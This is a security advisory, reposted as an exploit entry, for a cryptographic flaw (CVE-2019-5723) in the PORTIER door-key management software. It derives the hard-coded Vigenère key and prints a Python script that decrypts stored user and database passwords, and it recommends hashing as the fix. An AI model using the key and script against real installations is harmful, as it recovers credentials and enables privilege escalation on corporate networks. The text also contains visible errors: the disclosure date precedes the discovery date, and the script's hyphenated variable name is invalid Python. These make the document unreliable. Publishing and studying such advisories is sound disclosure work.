@@ -1,0 +1,153 @@
+id: 31945
+date: 01/14/2019
+title: PORTIER 4.4.4.2 / 4.4.4.6 Cryptographic Issues Exploit
+author: Christian Pappas
+cves: CVE-2019-5723
+
+PORTIER 4.4.4.2 / 4.4.4.6 Cryptographic Issues Exploit
+
+Product: PORTIER
+Affected Version(s): 4.4.4.2, 4.4.4.6
+Tested Version(s): 4.4.4.2, 4.4.4.6
+Vulnerability Type: Cryptographic Issues (CWE-310)
+Risk Level: HIGH
+Solution Status: Open
+Manufacturer Notification: 2018-06-13
+Solution Date: -
+Public Disclosure: 2018-01-09
+CVE Reference: CVE-2019-5723
+Author of Advisory: Christian Pappas, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+portier vision is a rich client application for managing door keys allocated 
+to certain persons or group of persons.
+
+The manufacturer describes the product as follows (see [1]):
+
+"portierA(r) vision
+ * manages locking systems and access rights in a modern and efficient manner
+ * stores all the details for every single key
+ * provides you lightning fast with all the information you need in a format 
+   you choose
+portier A(r)vision easy - secure - fast, our idea of software."
+
+Passwords are stored encrypted rather than as a hash value and the used 
+VigenA"re algorithm is badly outdated. Moreover, the keyword is static and quite 
+too short. Due to this, the passwords stored by the application can be easily 
+decrypted.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+Both user passwords in the database and the password for the database itself 
+in the 'portiervision.ini' configuration file are stored reversible encrypted. 
+The enforced password policy requires at least 1 up to 15 character long 
+passwords.
+
+The passwords are encrypted by a VigenA"re cipher, which is a series of 
+interwoven Caesar ciphers based on the characters of the keyword. In this 
+particular application, the keyword is  static and 15 bytes long. Static 
+means, in this special case, hard coded.
+
+Once an attacker has access to the encrypted passwords, he or she can easily 
+decrypt these and, thereby, escalate his or her privileges. As decrypting the 
+user passwords the privilege escalation is obviously limited to the 
+application. But because the same keyword is reused for encrypting the 
+database password, attackers might go beyond this point and try out these 
+credentials to take over control of other systems in the corporate network.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof-of-Concept (PoC):
+
+To break the encryption and derive the keyword, the following list of pairs of 
+plain-text and encrypted passwords is analyzed:
+
+    #n   plain-text password   encrypted password
+     1   A                     d
+     2   AA                    dI
+     3   AAA                   dIo
+     4   AAAA                  dIo:
+     5   AAAAAAAA              dIo:iO95
+     6   AAAAAAAAAAAAAAA       dIo:iO95>O1+qtm
+     7   BBBBBBBBBBBBBBB       eJp;jP:6?P2,run
+     8   CCCCCCCCCCCCCCC       fKq<kQ;7@Q3-svo
+     9   DDDDDDDDDDDDDDD       gLr=lR<8AR4.twp
+    10   YYYYYYYYYYYYYYY       !a,R&gQMVgIC.1*
+    11   ZZZZZZZZZZZZZZZ       "b-S'hRNWhJD/2+
+    12   aaaaaaaaaaaaaaa       )i4Z.oYU^oQK692
+    13   bbbbbbbbbbbbbbb       *j5[/pZV_pRL7:3
+    14   ABCDEFGHIJKLMNO       dJq=mT?<FX;6"& 
+    15   ONMLKJIHGFEDCBA       rV EsXA<DT5.sum
+
+The length of the encrypted password equals the length of the plain-text 
+password. Thus, no block ciphers could be in use. Because of an equidistant 
+offset of the ASCII representation of m consecutive pairs of plain-text and 
+encrypted passwords, it is assumed that a static key is used. The temporary key 
+candidate is a list of offsets of the ASCII representation of the encrypted 
+password in decimal notation:
+
+    #n               temporary key candidate
+    6, 7, 8, 9, 15   [-35, -8, -46, 7, -40, -14, 8, 12, 3, -14, 16, 22, -48, -51, -44]
+    10, 11, 12, 13   [ 56, -8,  45, 7,  51, -14, 8, 12, 3, -14, 16, 22,  43,  40,  47]
+    14               [-35, -8, -46, 7, -40, -14, 8, 12, 3, -14, 16, 22,  43,  40,  47]
+
+The difference between the offsets of each temporary key candidate to the 
+others is always 91, so the static key has to be the following:
+
+    [-35, -8, -46, 7, -40, -14, 8, 12, 3, -14, 16, 22, -48, -51, -44]
+
+The first printable ASCII character is the space. Its decimal value is 32. But 
+the application does not accept spaces in the password. Therefore, the 
+effective first character has the decimal value 33. This results in the 
+following Python script for decrypting the passwords:
+
+    #!/bin/python
+    import sys
+
+    static_key = [-35, -8, -46, 7, -40, -14, 8, 12, 3, -14, 16, 22, -48, -51, -44]
+
+    encrypted_password = list(sys.argv[1])
+    key = static_key[:len(encrypted_password)]
+    plain-text_password = list()
+
+    for i in range(len(encrypted_password)):
+        decrypted_character = (ord(encrypted_password[i]) - 33 + key[i] + 91) % 91 + 33
+        plain-text_password.append(chr(decrypted_character))
+
+    print("Decrypted password: " + "".join(plain-text_password))
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Store user passwords only as a hash value. Therefore, a suitable cryptographic 
+hashing algorithm like PBKDF2 or bcrypt should be chosen. As it comes to the 
+implementation, it should be made use of well-known libraries or operating 
+system services. SySS GmbH is not aware of a solution to the reported security 
+issue provided by the manufacturer.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2018-05-23: Vulnerability discovered
+2018-06-13: Vulnerability reported to manufacturer
+2018-01-09: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for PORTIER
+    https://portier.de/
+[2] SySS Security Advisory SYSS-2018-011
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-011.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+#  0day.today [2023-03-25]  #
